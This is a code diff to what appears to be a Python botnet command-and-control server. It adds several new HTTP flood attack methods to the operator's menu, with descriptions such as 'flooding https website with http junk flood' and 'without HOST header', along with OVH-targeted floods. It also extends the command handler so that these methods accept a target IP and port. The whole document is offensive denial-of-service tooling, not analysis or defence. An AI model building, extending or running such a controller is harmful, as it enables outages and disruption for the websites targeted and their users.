@@ -33,10 +33,15 @@ methods_list = f"""{color_char(160)}╔═════════════�
 {color_char(160)}║ {color_char(196)}METHODS             {color_char(197)}TYPE  {color_char(198)}LAYER  {color_char(199)}REQUIRE   {color_char(200)}DESCRIPTION                                           {color_char(160)}║
 ╠══════════════════╦═══════╦═════╦═════════╦═══════════════════════════════════════════════════════╣
 ║ {color_char(197)}HTTP_19          {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding http website with less option.           {color_char(160)}║
+║ {color_char(197)}HTTP_26          {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding http website with hybird flood.          {color_char(160)}║
 ║ {color_char(197)}HTTP_41          {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding http website with less line.             {color_char(160)}║
 ║ {color_char(197)}HTTP_84          {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding http website.                            {color_char(160)}║
-║ {color_char(197)}HTTP_144         {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding website with all http methods.           {color_char(160)}║
+║ {color_char(197)}HTTP_170         {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding website with all http methods.           {color_char(160)}║
 ║ {color_char(197)}HTTP_HEX         {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding http website with hex.                   {color_char(160)}║
+║ {color_char(197)}HTTP_LETTER      {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding https website with 1 letter per path.    {color_char(160)}║
+║ {color_char(197)}HTTP_RAP         {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding https website with http junk flood.      {color_char(160)}║
+║ {color_char(197)}PPS              {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding https website without HOST header.       {color_char(160)}║
+║ {color_char(197)}HTTP_OHIO        {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding https website with weird http flood.     {color_char(160)}║
 ║ {color_char(197)}OVH_RPS          {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding ovh with http methods.                   {color_char(160)}║
 ║ {color_char(197)}OVH_CONNECT      {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding ovh with connection.                     {color_char(160)}║
 ║ {color_char(197)}OVH_ALL          {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding with all methods of ovh.                 {color_char(160)}║
@@ -305,7 +310,7 @@ def cnc(client_socket,address,username):
    for x in c2_icon.split('\n'):
     send_packet(client_socket,x,ex=True)
     time.sleep(0.1)
-  elif COM == 'HTTP_19' or COM == 'HTTP_41' or COM == 'HTTP_84' or COM == 'HTTP_ALL' or COM == 'HTTP_HEX' or COM == 'HTTP_144':
+  elif COM == 'HTTP_19' or COM == 'HTTP_26' or COM == 'HTTP_41' or COM == 'HTTP_84' or COM == 'HTTP_ALL' or COM == 'HTTP_OHIO' or COM == 'PPS' or COM == 'HTTP_LETTER' or COM == 'HTTP_RAP' or COM == 'HTTP_HEX' or COM == 'HTTP_170':
    if len(commands) == 6:
     ip = commands[1]
     port = commands[2]
